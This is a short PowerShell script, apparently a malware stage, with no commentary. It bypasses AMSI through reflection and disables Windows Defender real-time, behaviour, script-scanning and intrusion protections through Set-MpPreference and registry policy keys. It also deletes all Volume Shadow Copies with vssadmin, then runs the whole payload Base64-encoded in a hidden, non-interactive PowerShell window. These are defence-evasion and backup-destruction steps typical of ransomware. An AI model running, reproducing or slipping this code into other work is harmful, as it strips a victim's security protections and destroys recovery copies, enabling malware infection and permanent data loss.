$c = @"
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdate $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true;
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f;
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f;
vssadmin delete shadows /all /quiet;
"@
$b = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($c))
powershell -NoP -NonI -W Hidden -Enc $b
